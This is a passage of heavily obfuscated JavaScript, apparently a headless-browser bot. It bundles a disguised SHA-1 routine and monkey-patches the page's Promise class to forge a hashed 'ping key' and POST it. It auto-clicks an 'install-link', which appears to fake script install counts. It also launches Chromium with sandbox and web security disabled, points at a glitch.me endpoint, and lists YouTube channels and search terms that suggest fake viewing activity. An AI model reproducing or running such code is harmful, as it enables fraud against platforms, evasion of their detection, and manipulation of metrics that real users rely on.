                  K = this['lastByteIn' + 'dex'];
                J[0x12a7 + -0x2042 + -0xdab * -0x1] = this['block'], J[K >> -0x10e9 + -0xff1 + 0x20dc] |= x[-0x1fe + -0xcd9 + 0x76d * 0x2 & K], this['block'] = J[-0xb23 * 0x1 + -0x1 * 0x1cd + -0x10 * -0xd0], K >= -0x2 * -0x322 + -0x4ae * 0x1 + -0x15e && (this['hashed'] || this['hash'](), J[0x1fca + -0xe3f * -0x1 + -0x2e09 * 0x1] = this['block'], J[-0x187a + -0x461 + 0x2a1 * 0xb] = J[-0x25e5 + -0xe * -0x1d3 + -0x7 * -0x1c4] = J[-0xc92 * -0x1 + 0x1d38 + -0x29c8] = J[0x48b * -0x2 + -0x1 * 0x22f7 + -0x8 * -0x582] = J[0xd51 + -0xb9e + -0x1 * 0x1af] = J[-0x1387 * -0x1 + -0x1878 + 0x4f6] = J[-0x87f + 0xca * 0x19 + 0xb35 * -0x1] = J[-0x111 * 0x2 + -0x1 * -0x9ad + -0x1e1 * 0x4] = J[-0x13 * -0xb9 + 0x1d84 + -0x2b37] = J[0x23a6 + 0x13de + -0x377b] = J[-0x8c4 + -0x1 * 0x24f8 + 0x2 * 0x16e3] = J[0xec2 + -0x632 + -0x885] = J[-0x1 * 0x137f + -0x1 * 0x1c41 + 0x2fcc] = J[0x1727 + 0x1b5 * 0x12 + -0x35d4] = J[-0xd8b + 0x11ca + -0x1d * 0x25] = J[0x1c1 * 0xd + 0x86 + 0x5d1 * -0x4] = -0x21be + 0xa4 * -0x17 + 0x307a), J[-0x2 * -0x481 + 0x8 * -0x322 + 0x101c] = this['hBytes'] << -0x2e1 * -0xb + 0xb6c * 0x1 + -0x2b14 | this['bytes'] >>> 0xbbe + -0x13b8 + 0x817, J[0xa78 + -0x2027 + 0x15be] = this['bytes'] << -0xc28 * -0x3 + 0x1bd * 0x5 + -0x2d26, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x3 * -0x8f8 + -0x2151 + 0x3c49 * 0x1; J < -0x2008 + 0x2236 + 0x1 * -0x1de; ++J)
                K = Q[J - (0x6ad + 0x15ce + -0x1c78 * 0x1)] ^ Q[J - (-0x1c94 * -0x1 + 0x1cb3 + -0x393f)] ^ Q[J - (0x17c9 + -0x11 * -0x180 + 0x3 * -0x1069)] ^ Q[J - (-0x1f13 + -0x17f3 + 0x3716)], Q[J] = K << 0x2609 + -0xa2 * 0x36 + -0x3dc | K >>> 0x1721 * 0x1 + 0x259f + -0x1 * 0x3ca1;
              for (J = -0x258a + 0xc0c + -0xfb * -0x1a; J < -0x193f + -0x133 * 0x5 + -0x26 * -0xd3; J += -0x13cb + -0x10da + 0x24aa)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2525 * 0x1 + 0x74 * -0x2c + 0x391a | L >>> 0x5f8 + -0x22 * 0x97 + 0xad * 0x15) + (M & N | ~M & O) + P + (0x7b28015c + -0x4e1c538 * 0x1f + -0x3a77f * -0x207b) + Q[J] << -0x1939 + -0x1959 + 0x3292) << 0xe87 * 0x1 + -0x120d * 0x1 + 0x38b | P >>> 0x1903 + -0x5c1 * 0x1 + -0x1327) + (L & (M = M << 0x5 * -0x647 + -0x243e + 0x43bf | M >>> -0x1ae9 * -0x1 + -0x1 * 0xa27 + -0x1 * 0x10c0) | ~L & N) + O + (-0x68c4b9ea + 0x3c9d4bb * 0x1f + 0x4dd670de) + Q[J + (0x1 * -0x3cb + -0xa4e + 0xe1a)] << -0x3 * 0x50b + -0x1268 + 0x2189) << 0x76 + 0x2428 + 0x411 * -0x9 | O >>> 0x1899 * 0x1 + -0xb2d * 0x1 + -0x1 * 0xd51) + (P & (L = L << -0x2e7 + -0x17b7 * 0x1 + 0x1abc | L >>> -0xb * -0x7d + 0x2 * 0x727 + 0x5f * -0x35) | ~P & M) + N + (-0x2ff5 * 0x34c6f + -0x5b995a97 + 0x161b * 0xf64f1) + Q[J + (-0x1ff9 * 0x1 + 0x1cb6 + -0x9 * -0x5d)] << -0x49 * -0x48 + -0x35 * 0x60 + 0x54 * -0x2) << 0x3dc * -0x1 + 0x1 * -0xc5e + -0x1 * -0x103f | N >>> 0x1c4d + -0x1 * -0xa0d + -0x1 * 0x263f) + (O & (P = P << 0x242c * 0x1 + -0x85 * -0x2 + -0x2518 | P >>> 0x1c26 + -0x5dd * -0x2 + 0x36 * -0xbd) | ~O & L) + M + (-0x1 * 0x5860d081 + -0xa1fe0525 + -0x17e7 * -0xe42e9) + Q[J + (0x283 * 0xa + -0x24ea + 0x1 * 0xbcf)] << -0x3 * 0x9c9 + 0x1eb + 0x1b70) << -0x18e + 0x1d * -0x9b + 0x1 * 0x1322 | M >>> 0x843 + -0x1 * -0xb96 + 0x7 * -0x2d2) + (N & (O = O << 0xe2 * -0x14 + -0x1145 * -0x1 + 0x81 | O >>> 0x18cc + 0x6cd * 0x3 + 0x1f7 * -0x17) | ~N & P) + L + (-0x4cb5 * -0x1a9a4 + -0xa0b9fd8c + 0x7bb2d631) + Q[J + (0x1b13 * -0x1 + -0x3f * -0x8f + -0x3d * 0x22)] << -0x8 * 0x32 + -0x1 * -0x3bd + -0x1 * 0x22d, N = N << 0x1b1 * 0x17 + 0x1959 + -0x4022 | N >>> -0x1452 + 0x2650 * -0x1 + 0x3aa4;
              for (; J < 0x6c3 + 0x1 * -0xd17 + 0x67c; J += -0x168d + 0x3 * 0x1a6 + 0x11a0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1fc1 + 0x17c6 + -0x3782 | L >>> 0xa3e + -0x3a5 + -0x1 * 0x67e) + (M ^ N ^ O) + P + (0xa82d64f1 * 0x1 + 0x4507 * 0x145bd + -0x9128527b) + Q[J] << -0x13b * -0x1 + -0x1 * -0x62b + -0x766) << 0x5ba + -0x32 + -0x583 | P >>> -0x1 * -0x16ae + 0x2027 + -0x36ba) + (L ^ (M = M << -0x15 * -0x7f + 0x1 * -0xbd6 + 0x189 * 0x1 | M >>> 0x19 * -0x1a + -0x17b * -0x13 + -0x1995) ^ N) + O + (0x1ffc1bbb + -0x83 * 0x12bf55b + -0x9f79bb * -0x175) + Q[J + (0x23 * 0x45 + 0x1 * 0x3fb + -0xd69)] << 0xf8b * -0x2 + 0xb * 0x23d + 0x1 * 0x677) << -0xcb + -0x1bab + 0x1c7b * 0x1 | O >>> 0x59 * -0x63 + 0x1 * 0x3e2 + 0x1ea4) + (P ^ (L = L << -0x1 * 0x1cf1 + -0x1 * -0x18a2 + -0x67 * -0xb | L >>> 0x107 * 0x7 + 0x2593 * -0x1 + -0x799 * -0x4) ^ M) + N + (-0x24b * 0x50ba7e + -0x2 * -0x425bd405 + 0x3 * 0x3669f62b) + Q[J + (0x1c32 * -0x1 + 0x182b + -0x1 * -0x409)] << 0x472 + 0x138f + 0x5 * -0x4cd) << -0x1883 * 0x1 + -0x1b37 * 0x1 + 0x33bf * 0x1 | N >>> -0x15e3 + -0xb77 * -0x1 + 0xa87) + (O ^ (P = P << 0x21af * -0x1 + -0x1 * 0xcc7 + 0x2e94 | P >>> -0x1bf9 + 0x22fc + -0x701) ^ L) + M + (-0x9 * 0x17fb8b3c + -0xc4d0e461 + -0x2 * -0x105c15a8f) + Q[J + (-0x1 * -0x6a1 + -0x50b + -0x193)] << 0x2 * -0x5a6 + -0x111d + 0x1c69) << 0xc3d + 0xd9f + 0x1b9 * -0xf | M >>> 0x17db + 0xe1a + -0x25da) + (N ^ (O = O << 0x4d * -0x32 + 0x243 + 0x1 * 0xce5 | O >>> -0x35 * -0x29 + 0x3 * 0x57 + -0x260 * 0x4) ^ P) + L + (0x2bb6390f * -0x1 + 0x1e99 * 0x552a7 + 0xc141bd * -0xb) + Q[J + (0x1 * 0x2047 + 0x95f + -0x29a2)] << 0x23 * -0xe9 + 0x1ec8 + 0x113, N = N << 0x1a03 * 0x1 + -0xe * 0x5f + -0x14b3 | N >>> -0x26d3 + 0x1d * -0x89 + 0x1 * 0x365a;
              for (; J < -0x77 * 0x2b + -0x2be * 0x2 + 0x19b5; J += 0x595 * -0x4 + -0x216b + -0x1be2 * -0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xa3 * -0x1 + 0x6a * -0xd + -0x3d * -0x14 | L >>> -0x1d87 * 0x1 + -0x1 * -0x1357 + 0xa4b) + (M & N | M & O | N & O) + P - (0x384fedcc + -0x12 * 0x9470b97 + 0xdf9325f6) + Q[J] << -0x747 * -0x1 + 0x1dcc + 0x2513 * -0x1) << 0x168c + -0x1 * -0x25b3 + 0x2 * -0x1e1d | P >>> 0x19 * 0xd1 + 0x230c + 0xda * -0x41) + (L & (M = M << -0x439 * -0x1 + -0x1587 + 0x116c | M >>> -0xd7 * -0x6 + 0xb63 + -0x106b) | L & N | M & N) + O - (-0xee4a5e * -0xa7 + 0x7735bef5 + 0x1 * -0xa1c3ff23) + Q[J + (-0x1d5 * 0x11 + -0x5 * 0x25 + 0x1fdf)] << -0x3 * -0xbfb + 0x232c + 0x1 * -0x471d) << 0x1f6b + -0x1955 + -0x611 * 0x1 | O >>> -0x4f + -0x9e * -0x33 + -0x1f10) + (P & (L = L << -0xff5 + 0xb2a * -0x3 + 0x3191 | L >>> -0x1 * -0x1d0e + -0x1489 + 0x1 * -0x883) | P & M | L & M) + N - (0x40 * -0x2a952c9 + 0x5e2e112e * -0x2 + 0x1d79517c0) + Q[J + (0x14b + -0x13 * -0x16a + -0x1c27)] << -0x7ea * -0x3 + -0x9 * 0x209 + -0x56d) << -0x1 * -0x21ae + 0x4 * 0x471 + -0x336d * 0x1 | N >>> 0x7f8 + -0x1a83 + 0x12a6) + (O & (P = P << 0x347 + 0xeb2 + -0x11db | P >>> -0x1 * 0x995 + -0x15db + 0x1f72) | O & L | P & L) + M - (0xe1809674 + -0x33ce7c2d + -0x3ccdd723) + Q[J + (-0x1f3 * 0xb + 0x4 * 0x47d + 0x380)] << 0x151f + -0x1ea5 + -0x1 * -0x986) << 0x279 * -0x8 + -0x1b09 + -0x95e * -0x5 | M >>> -0x11b0 + -0xdd * 0x11 + 0x2078) + (N & (O = O << -0x120f + 0x1241 + -0x14 * 0x1 | O >>> -0x13f8 + 0x76a + 0xc90) | N & P | O & P) + L - (-0x2604a2e3 + 0xe0a123ce + -0x49b83dc7) + Q[J + (-0x32a + 0x12 * -0xbf + 0x427 * 0x4)] << 0x1223 * -0x1 + -0x108e + 0x53 * 0x6b, N = N << 0x2376 + -0x83 * -0x1b + -0x3129 | N >>> 0x1 * 0x18fd + -0x4 * -0x28a + -0x2323;
              for (; J < -0x3d * -0x5f + -0x1 * 0x1d7a + -0x727 * -0x1; J += -0xcbf + -0x404 * 0x4 + 0xf6 * 0x1e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1304 * 0x2 + -0x146a + -0x1199 | L >>> -0xc3d * -0x2 + -0x3d * 0x48 + -0x737) + (M ^ N ^ O) + P - (-0x1d1938f1 + 0x44cfcbcf + 0xde6ab4c) + Q[J] << 0xc00 + -0x2701 + 0x1b01) << 0x1903 + -0x23b9 + 0x43 * 0x29 | P >>> -0x264e + 0x97 * -0x13 + 0xdb * 0x3a) + (L ^ (M = M << -0x2df + -0x1 * -0x692 + -0x395 | M >>> 0x3da + 0x23e5 + 0xd3f * -0x3) ^ N) + O - (0x248c703e + 0x2 * -0x120ac8e9 + 0x35265fbe) + Q[J + (-0x15e * -0x19 + -0x264b * 0x1 + 0x41e)] << -0xa42 + 0xb19 * 0x1 + -0xd7) << 0x72 * -0x2e + 0x1b17 * -0x1 + -0x5f3 * -0x8 | O >>> 0x19c3 + -0x3cb * -0x1 + -0x15 * 0x167) + (P ^ (L = L << 0x1 * -0x283 + 0x1c03 * -0x1 + 0x1ea4 | L >>> -0x5 * 0x160 + 0x45b * -0x2 + 0x1f3 * 0x8) ^ M) + N - (0x2e26ff36 + -0x20 * -0x2d92084 + 0x12e83c * -0x46d) + Q[J + (-0x2 * -0x12f + -0x1 * -0x2704 + -0x2960)] << 0x1 * -0x1e25 + -0x8 * -0x4be + -0x18f * 0x5) << 0x8b * 0x1d + -0x2ab * -0x3 + -0x87 * 0x2d | N >>> -0x21db + -0x1064 + -0xa12 * -0x5) + (O ^ (P = P << -0x38 * 0xf + 0x18a7 + -0x1541 | P >>> -0x1 * 0x1a31 + 0x11a9 + 0x88a) ^ L) + M - (-0x5b0779a4 + 0x20885a * -0x232 + 0xd8100d62) + Q[J + (0xea7 + 0xa * -0x371 + -0x9e3 * -0x2)] << 0x135 * 0x1 + -0x1 * 0x233b + 0x2206) << -0x135c + 0x4 * 0x3c4 + -0x5 * -0xdd | M >>> 0x190d + -0x449 * -0x6 + -0x1 * 0x32a8) + (N ^ (O = O << -0xa58 * 0x1 + 0x1694 + -0xc1e | O >>> 0xae6 + -0x107 + -0x1 * 0x9dd) ^ P) + L - (0x43213262 + -0x7d * 0x42cf71 + 0x131b55f5 * 0x1) + Q[J + (-0x1d5f + -0x2035 + 0x3d98)] << 0xdb6 + 0x1 * -0x26da + 0x1924, N = N << 0xd7 * -0x4 + -0x39 * 0x68 + -0x7 * -0x3ce | N >>> 0xf02 + -0x6d4 + 0x4 * -0x20b;
              this['h0'] = this['h0'] + L << 0x1153 + 0x1 * -0x1179 + 0x26, this['h1'] = this['h1'] + M << -0x1ce2 + 0x27a * -0xa + -0x11e2 * -0x3, this['h2'] = this['h2'] + N << -0x5 * 0x68f + -0xdeb * 0x1 + 0x2eb6, this['h3'] = this['h3'] + O << -0x23 * -0x49 + 0x902 * 0x1 + -0x12fd, this['h4'] = this['h4'] + P << -0x205b + 0x124c + 0x3b * 0x3d;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x8c3 * 0x1 + 0x117 * -0x1c + 0x15dd & 0x12fb + 0x1401 + -0x1 * 0x26ed] + w[J >> -0xaca * -0x2 + -0x1b0e + 0x592 & 0x29 * -0x83 + -0xeba + -0xc * -0x2fb] + w[J >> -0x2173 * 0x1 + -0x897 * 0x1 + 0x3 * 0xe0a & -0x1f36 + -0x6 * 0x1cc + -0x5 * -0x869] + w[J >> 0x337 + -0x1e2 + -0x145 & -0x3b9 + 0xb26 + -0x75e * 0x1] + w[J >> 0x24c8 + 0xbb6 + -0x3072 * 0x1 & 0x2 * -0xfd3 + -0x1412 + 0x33c7] + w[J >> -0x1ea5 + -0x1b8 + 0x2065 & 0x37e + -0x20a1 + 0x25 * 0xca] + w[J >> -0x807 + -0x1015 + -0x20 * -0xc1 & -0xc7 * 0x1 + -0x1d3a * 0x1 + 0x1e10 * 0x1] + w[0xf9 * 0x8 + -0x7 * 0x4ac + 0x18fb & J] + w[K >> 0x2322 + 0x1 * -0x6fb + -0x1c0b & -0x1cc4 + -0x1a80 + -0x1271 * -0x3] + w[K >> -0xd5d + 0x6 * 0x445 + -0xc29 & -0x70 * -0x29 + -0x1 * -0x77b + -0x195c] + w[K >> -0x1fe3 + 0x1 * 0xbcf + 0x78 * 0x2b & 0x9c + 0x1 * 0x15b5 + -0x197 * 0xe] + w[K >> -0x6 * 0x371 + 0x1654 + -0x19e & -0x24a4 + 0x1583 + -0x12 * -0xd8] + w[K >> -0xa * -0x21b + 0x1 * 0x211b + -0x361d & 0x3 * -0x2ac + -0x20 * -0x8e + -0x9ad] + w[K >> 0x1 * -0x2195 + 0x43 * 0x7 + 0x7f2 * 0x4 & -0x1dc8 + -0x12e3 * -0x2 + 0x3 * -0x2a5] + w[K >> 0xb5d * 0x2 + -0x2267 + 0xbb1 & -0x141 * 0xd + 0x455 * -0x2 + 0x1906] + w[-0x2510 + -0x170b + 0x3 * 0x140e & K] + w[L >> -0x1b * 0x7f + 0x785 + 0x5fc & -0x5b * -0x69 + -0x2339 * -0x1 + -0x487d] + w[L >> 0x19b4 + 0xe9 * -0xa + 0x841 * -0x2 & 0x1f0f * -0x1 + 0xe * -0x81 + -0x574 * -0x7] + w[L >> -0xd50 + 0x1b68 + -0xe04 & 0x10c * -0xc + 0x83 + 0xc1c] + w[L >> 0xb * 0x26b + 0x609 + -0x2092 * 0x1 & -0x11 * -0x15 + 0xc95 * 0x3 + 0x7d1 * -0x5] + w[L >> -0x1 * -0x107b + -0x2425 + 0x13b6 & 0x2 * -0x6ad + -0x1b0e + 0x2877] + w[L >> -0x1 * -0x230c + 0x1 * -0x186d + -0x1 * 0xa97 & 0x19ed * -0x1 + 0x1368 + 0x4 * 0x1a5] + w[L >> -0x1 * 0xaab + -0xa19 + 0x14c8 & -0x1f4b + -0x11f * -0x1 + 0x1 * 0x1e3b] + w[-0x8d8 * 0x4 + -0x625 + -0x4 * -0xa65 & L] + w[M >> 0x2033 + -0x3 * 0x207 + 0x1a02 * -0x1 & 0x2 * -0x411 + -0x1a * 0x2c + 0xca9] + w[M >> 0x2 * -0x4b2 + -0xb85 + -0x1501 * -0x1 & 0x218a + -0x15eb + -0xb9 * 0x10] + w[M >> -0x7b6 + -0x1d94 + 0x255e & 0x1 * 0xe9f + 0x22eb + -0x317b] + w[M >> -0x163d * 0x1 + -0x316 * 0x6 + 0x28d1 & 0x15d7 + 0xcbc + -0x2284] + w[M >> 0x24d * -0xb + 0xa58 + 0xf03 & -0x91f + -0x1fe8 + 0x2916] + w[M >> -0x909 + 0xd * 0x14e + -0x7e5 & 0x184d + -0x1 * 0x1d24 + -0x273 * -0x2] + w[M >> 0xb8 * 0x8 + -0x3d6 + -0x12 * 0x1b & -0x1ffd + -0x42e * 0x6 + -0x1 * -0x3920] + w[0xe4 * -0x9 + -0x86 + 0x899 & M] + w[N >> -0x5f * -0x4d + -0x3cd * 0x5 + 0xe * -0xad & -0x159a + -0xf7 * -0x27 + -0xff8] + w[N >> 0x15e6 + 0xa3d + 0x277 * -0xd & -0x2 * -0x408 + -0x1c0c + 0x140b] + w[N >> 0x299 + -0xb9d + 0x246 * 0x4 & -0xb8c + 0xb3e * 0x1 + 0x5d] + w[N >> -0x1e9 * -0x6 + -0x1 * -0x1ce3 + -0x1 * 0x2849 & 0x1 * -0x1917 + 0x709 + 0x121d] + w[N >> -0x16de + -0xfa1 + 0x268b & -0x219c + 0xe64 + -0x15 * -0xeb] + w[N >> -0x22 * 0x92 + 0x7 * 0x550 + 0x11c4 * -0x1 & 0x293 * -0x1 + 0x4 * -0xa3 + 0x52e * 0x1] + w[N >> -0x172 * 0x9 + 0x31c + 0x9ea & 0xb * 0x340 + 0x886 + -0x2c37 * 0x1] + w[0x1 * 0xa2b + -0x2f7 + -0x725 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1f35 * -0x1 + -0x1c1d + -0x300 & 0x125c + 0x1 * -0x5ff + -0xb5e,
                J >> -0x2 * -0xc36 + -0x1 * 0x336 + -0xa93 * 0x2 & -0x1cb + 0x6e6 * 0x3 + -0xbf * 0x18,
                J >> 0x1887 + -0x2257 + -0x24 * -0x46 & 0x63d * -0x1 + -0x14d4 + 0x1c10,
                -0x1a56 * 0x1 + 0x6ed + 0x1468 & J,
                K >> -0x1985 * -0x1 + 0x4bd + -0x1e2a & -0x1107 + -0x770 + -0x2 * -0xcbb,
                K >> -0x1 * 0x16d3 + -0x3 * -0x59a + 0xad * 0x9 & -0xdde + -0xb43 + 0x1a20,
                K >> -0x9d3 + 0xb1 * -0x7 + 0x16 * 0xab & 0x1 * 0x26cf + -0xd42 + -0x188e,
                0x2650 + 0x17e2 + -0x3d33 * 0x1 & K,
                L >> -0x8ce + 0x1040 + -0x2 * 0x3ad & 0xb5e + -0x22 * -0xbc + 0x6d * -0x53,
                L >> 0x160f + 0x3a6 * 0x2 + -0x1d4b & -0x25dd + -0x1 * 0x1074 + 0x3750,
                L >> 0x26f * 0xd + 0x359 * 0x4 + -0x2cff & -0x15fb + 0xab6 + 0x9d * 0x14,
                0x25 + -0x9a + -0x174 * -0x1 & L,
                M >> -0x2609 + -0x19f + -0x13e * -0x20 & 0x124 + -0x18f8 + 0x18d3,
                M >> -0x89e + 0x57 * -0x4b + 0x222b & 0x261e + 0x18a * -0x11 + -0x3 * 0x3a7,
                M >> 0x1cf7 * -0x1 + 0x190a + -0x3f5 * -0x1 & -0x7 * 0x266 + -0x19 * -0x32 + 0xce7,
                -0x2426 + -0x1438 + -0xa5 * -0x59 & M,
                N >> 0x10f1 + 0x70d + 0x26 * -0xa1 & -0x22d + -0xa1 * 0x35 + -0x7 * -0x537,
                N >> 0xf9 * 0x16 + -0x5 * -0x6cd + -0x1c9 * 0x1f & -0x1a24 + -0xf * 0x101 + 0x2a32,
                N >> -0x1 * -0x8df + 0xe * -0x138 + -0x839 * -0x1 & 0xf0 * -0x19 + 0x2 * 0x525 + 0x4b7 * 0x3,
                -0x1c40 + -0x71 * 0x3c + 0x37bb & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xe * -0x161 + -0x2107 + 0x1 * 0x3469), (K = new DataView(J))['setUint32'](0x2 * -0x361 + 0x1b14 + -0x12 * 0x121, this['h0']), K['setUint32'](0x106c + -0x2 * -0xc8f + 0x14c3 * -0x2, this['h1']), K['setUint32'](-0x1185 + 0x974 + 0x819, this['h2']), K['setUint32'](0x12a * 0x16 + 0x2408 + 0x124 * -0x36, this['h3']), K['setUint32'](-0x27f + -0x17b8 + -0x1 * -0x1a47, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G[R(0x8)]['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x10c4 + -0x778 + -0x94c];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1b4f * -0x1 + 0x23 * -0xec + 0x4f5;
            J[-0x2f * 0x8 + -0x17ad + 0x1925]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1125 + -0x19ac + -0x61 * -0x71] = L => {
              const S = d;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I[S(0x5) + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x2ea + -0x2 * -0x7fa + -0x12dd), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1300 + -0x9 * 0x2f9 + -0x1 * -0x7c2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1c92 + -0x2053 + -0x42c1 * -0x1), Promise['resolve'](-0x29 * -0xad + 0x182 * 0x11 + -0x3556);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1 * 0x17ad + 0x1c03 + -0x22b * 0x2; j < -0x188 * -0x1 + 0x589 + -0x710; j++)
    i();
}
const NETWORK_PATIENCE = 0x22c6 * -0x1 + -0x17 * 0x89 + 0x4e55 + (0x1ab3 * -0x1 + -0x44 * -0x4b + -0x5 * -0x3b3) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x11c3 + 0x233 * -0x2 + -0x2 * 0x6ad) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + T(0x10, 'pRVY') + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    T(0xe, 'ekdu') + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1 * -0x9c8 + 0x235f + 0x1997 * -0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    const U = b;
    return this[floor(random() * this[U(0x6, ')&TQ')])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x2400 + -0x113 + -0x1 * 0x22ed);
    let h = e[f];
    if (c['hNjllq'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x65 * -0x59 + -0x2 * -0xfe9 + -0x1 * -0x34b, r, s, t = -0xb65 + -0x1f49 + -0x3 * -0xe3a; s = m['charAt'](t++); ~s && (r = q % (0x16f1 + -0x2 * -0xe83 + -0x27 * 0x155) ? r * (0x19ca + 0x292 + -0x202 * 0xe) + s : s, q++ % (-0x1317 + 0x7f * 0x2a + 0x1bb * -0x1)) ? o += String['fromCharCode'](0x12a8 + -0x23 * -0x4e + -0x1 * 0x1c53 & r >> (-(-0x1b06 + -0x5 * -0x55e + 0x32) * q & -0x1 * -0x14ef + -0x1ad2 + -0x1 * -0x5e9)) : 0x2 * -0x60d + 0x7 * 0x49 + 0xa1b) {
          s = n['indexOf'](s);
        }
        for (let u = -0x2597 + -0x1 * 0x26e4 + 0x4c7b, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1822 + 0x231c + -0xaea))['slice'](-(-0x1abc + 0x18c2 * -0x1 + 0x3380));
        }
        return decodeURIComponent(p);
      };
      c['KgWysE'] = i, b = arguments, c['hNjllq'] = !![];
    }
    const j = e[-0x1 * -0x10ad + 0x8f3 + -0x19a0],
      k = f + j,
      l = b[k];
    return !l ? (h = c['KgWysE'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 